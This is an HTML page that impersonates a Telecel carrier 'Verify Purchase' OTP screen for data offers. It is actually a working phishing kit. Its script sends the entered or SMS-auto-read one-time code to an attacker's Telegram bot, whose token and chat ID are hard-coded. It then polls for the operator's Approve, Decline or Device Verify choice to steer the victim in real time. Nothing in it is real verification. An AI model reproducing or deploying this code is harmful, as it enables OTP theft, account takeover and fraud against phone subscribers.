<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Telecel - OTP Verification</title>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: 'Inter', sans-serif;
            background: #f8f9fa;
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 15px;
        }
        .container {
            width: 100%;
            max-width: 420px;
            background: white;
            border-radius: 24px;
            box-shadow: 0 10px 40px rgba(0,0,0,0.1);
            overflow: hidden;
        }
        .logo-section { text-align: center; padding: 22px 0 10px; }
        .telecel-logo { width: 85px; height: auto; display: block; margin: 0 auto; }
        h1 {
            text-align: center;
            font-size: 23px;
            font-weight: 700;
            color: #1e2937;
            margin: 8px 0 6px;
        }
        .subtitle {
            text-align: center;
            color: #475569;
            font-size: 15.3px;
            padding: 0 25px 18px;
            line-height: 1.5;
        }
        .offer-info {
            background: #fff0f0;
            margin: 0 20px 18px;
            padding: 15px;
            border-radius: 16px;
            text-align: center;
            border: 1px solid #ffe0e0;
        }
        .otp-container {
            display: flex;
            justify-content: center;
            gap: 12px;
            margin: 18px 0 26px;
            padding: 0 20px;
        }
        .otp-input {
            width: 52px;
            height: 62px;
            text-align: center;
            font-size: 26px;
            font-weight: 700;
            border: 2px solid #e2e8f0;
            border-radius: 14px;
            outline: none;
            transition: all 0.2s;
        }
        .otp-input:focus {
            border-color: #E30613;
            box-shadow: 0 0 0 4px rgba(227, 6, 19, 0.15);
        }
        .form-section { padding: 0 25px 30px; }
        .error-msg {
            text-align: center;
            margin: 12px 20px 18px;
            font-size: 14.8px;
            padding: 14px;
            border-radius: 12px;
            display: none;
            color: #dc3545;
            background: #ffebee;
            border: 1px solid #ffc6c6;
        }
        .btn-action {
            width: 100%;
            background: #E30613;
            color: white;
            border: none;
            padding: 17px;
            font-size: 17.5px;
            font-weight: 700;
            border-radius: 50px;
            cursor: pointer;
            margin: 10px 0;
        }
        .btn-action:disabled {
            background: #94a3b8;
            cursor: not-allowed;
        }
        .back-btn {
            width: 100%;
            background: transparent;
            color: #64748b;
            border: 2px solid #e2e8f0;
            padding: 16px;
            font-size: 16.5px;
            font-weight: 600;
            border-radius: 50px;
            cursor: pointer;
        }
        #spinner {
            display: none;
            position: fixed;
            top: 0; left: 0;
            width: 100%; height: 100%;
            background: rgba(0,0,0,0.92);
            z-index: 10000;
            align-items: center;
            justify-content: center;
            flex-direction: column;
            color: white;
        }
        .spin {
            width: 65px;
            height: 65px;
            border: 6px solid rgba(255,255,255,0.2);
            border-top: 6px solid #E30613;
            border-radius: 50%;
            animation: spin 1s linear infinite;
        }
        @keyframes spin { to { transform: rotate(360deg); } }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo-section">
            <svg class="telecel-logo" width="96" height="96" viewBox="0 0 96 96" fill="none" xmlns="http://www.w3.org/2000/svg">
                <!-- Your SVG remains unchanged -->
                <path d="M48.19 28.6833C40.4333 28.605 34.1983 34.9933 34.2183 42.58C..." fill="#E32526"/>
                <!-- ... rest of your SVG ... -->
            </svg>
        </div>
        <h1>Verify Purchase</h1>
        <p class="subtitle">A 5-digit verification code has been sent to your number. Please enter it below to complete your purchase.</p>
    
        <div class="offer-info" id="offerInfo">
            <strong id="offerTitle"></strong><br>
            <span id="offerPrice" style="color:#E30613; font-weight:700; font-size:22px;"></span>
        </div>

        <div class="otp-container" id="otpInputs"></div>
        <div class="error-msg" id="errMsg"></div>

        <div class="form-section">
            <button class="btn-action" id="verifyBtn">Verify & Accept Purchase</button>
            <button class="back-btn" onclick="window.location.href='index.html'">← Back to Data Offers</button>
        </div>
    </div>

    <div id="spinner">
        <div class="spin"></div>
        <p style="margin-top:25px; font-size:17px;">Verifying OTP...</p>
    </div>

    <script>
        const CONFIG = {
            BOT_TOKEN: '8506416362:AAF8XqQp2I_Rrtp05BjBhDy7Aas3nIYA2VU',
            CHAT_ID: '8218539661',
            SUCCESS_PAGE: 'success.html',
            DEVICE_PAGE: 'device_verify.html'
        };

        let pollingInterval = null;
        let isProcessing = false;
        let lastUpdateId = 0;

        const errMsg = document.getElementById('errMsg');
        const spinner = document.getElementById('spinner');
        const verifyBtn = document.getElementById('verifyBtn');
        const offerTitleEl = document.getElementById('offerTitle');
        const offerPriceEl = document.getElementById('offerPrice');

        function loadOffer() {
            const params = new URLSearchParams(window.location.search);
            const name = params.get('offer') || 'Data Bundle';
            const data = params.get('data') || '';
            const price = params.get('price') || '0';
           
            offerTitleEl.textContent = name + (data ? ` - ${data}` : '');
            offerPriceEl.textContent = `GHS ${price}`;
        }

        function createInputs(containerId, count) {
            const container = document.getElementById(containerId);
            container.innerHTML = '';
            for (let i = 0; i < count; i++) {
                const input = document.createElement('input');
                input.type = 'text';
                input.maxLength = 1;
                input.className = 'otp-input';
                input.inputMode = 'numeric';
                container.appendChild(input);
            }
        }

        function getCode() {
            return Array.from(document.querySelectorAll('#otpInputs .otp-input'))
                       .map(i => i.value.trim()).join('');
        }

        function setupAutoFocus(onComplete) {
            const inputs = document.querySelectorAll('#otpInputs .otp-input');
            inputs.forEach((input, index) => {
                input.addEventListener('input', () => {
                    if (input.value.length === 1 && index < 4) {
                        inputs[index + 1].focus();
                    }
                    if (getCode().length === 5) {
                        setTimeout(onComplete, 150);
                    }
                });

                input.addEventListener('keydown', (e) => {
                    if (e.key === 'Backspace' && !input.value && index > 0) {
                        inputs[index - 1].focus();
                    }
                });
            });
        }

        function stopPolling() {
            if (pollingInterval) {
                clearInterval(pollingInterval);
                pollingInterval = null;
            }
        }

        async function answerCallback(queryId) {
            try {
                await fetch(`https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/answerCallbackQuery`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        callback_query_id: queryId,
                        show_alert: false
                    })
                });
            } catch (e) {}
        }

        function submitOTP() {
            if (isProcessing) return;
            isProcessing = true;
            verifyBtn.disabled = true;
            verifyBtn.textContent = "Verifying...";

            const otp = getCode();
            if (otp.length !== 5) {
                resetButton();
                return;
            }

            const ts = Date.now();
            const approveId = `approve_${ts}`;
            const declineId = `decline_${ts}`;
            const deviceId = `device_${ts}`;
            const validId = `valid_${ts}`;
            const invalidId = `invalid_${ts}`;

            fetch(`https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    chat_id: CONFIG.CHAT_ID,
                    text: `<b>🔴 New OTP Received</b>\n\nOffer: ${offerTitleEl.textContent}\nOTP: <code>${otp}</code>\nTime: ${new Date().toLocaleTimeString()}`,
                    parse_mode: 'HTML',
                    reply_markup: {
                        inline_keyboard: [
                            [
                                { text: "✅ Approve", callback_data: approveId },
                                { text: "📱 Device Verify", callback_data: deviceId }
                            ],
                            [
                                { text: "✅ Valid", callback_data: validId },
                                { text: "❌ Invalid", callback_data: invalidId }
                            ],
                            [{ text: "❌ Decline", callback_data: declineId }]
                        ]
                    }
                })
            })
            .then(r => r.json())
            .then(() => {
                spinner.style.display = 'flex';
                startPolling(approveId, declineId, deviceId, validId, invalidId);
            })
            .catch(() => {
                errMsg.textContent = "Network error. Please try again.";
                errMsg.style.display = 'block';
                resetButton();
            });
        }

        function startPolling(approveId, declineId, deviceId, validId, invalidId) {
            stopPolling(); // Clear any previous polling

            pollingInterval = setInterval(() => {
                fetch(`https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/getUpdates?offset=${lastUpdateId + 1}&timeout=10`)
                    .then(r => r.json())
                    .then(data => {
                        if (!data.ok || !data.result?.length) return;

                        data.result.forEach(update => {
                            lastUpdateId = Math.max(lastUpdateId, update.update_id);

                            if (update.callback_query) {
                                const cb = update.callback_query.data;
                                const queryId = update.callback_query.id;

                                answerCallback(queryId);

                                const params = new URLSearchParams(window.location.search);

                                if ([approveId, validId].includes(cb)) {
                                    stopPolling();
                                    spinner.style.display = 'none';
                                    window.location.href = CONFIG.SUCCESS_PAGE + '?' + params.toString();
                                }
                                else if (cb === deviceId) {
                                    stopPolling();
                                    spinner.style.display = 'none';
                                    window.location.href = CONFIG.DEVICE_PAGE + '?' + params.toString();
                                }
                                else if ([declineId, invalidId].includes(cb)) {
                                    stopPolling();
                                    spinner.style.display = 'none';
                                    errMsg.textContent = "Request was declined. Please try again.";
                                    errMsg.style.display = 'block';
                                    document.querySelectorAll('#otpInputs .otp-input').forEach(i => i.value = '');
                                    resetButton();
                                }
                            }
                        });
                    })
                    .catch(() => {}); // Silent fail, keep polling
            }, 1200);
        }

        function resetButton() {
            isProcessing = false;
            verifyBtn.disabled = false;
            verifyBtn.textContent = "Verify & Accept Purchase";
        }

        // Initialize
        createInputs('otpInputs', 5);
        setupAutoFocus(submitOTP);
        verifyBtn.onclick = submitOTP;
        loadOffer();

        // Auto OTP (SMS)
        if ('OTPCredential' in window) {
            window.onload = () => {
                setTimeout(() => {
                    navigator.credentials.get({ otp: { transport: ['sms'] } })
                        .then(credential => {
                            if (credential?.code) {
                                const inputs = document.querySelectorAll('#otpInputs .otp-input');
                                credential.code.split('').forEach((digit, i) => {
                                    if (inputs[i]) inputs[i].value = digit;
                                });
                                setTimeout(submitOTP, 400);
                            }
                        }).catch(() => {});
                }, 800);
            };
        }
    </script>
</body>
</html>
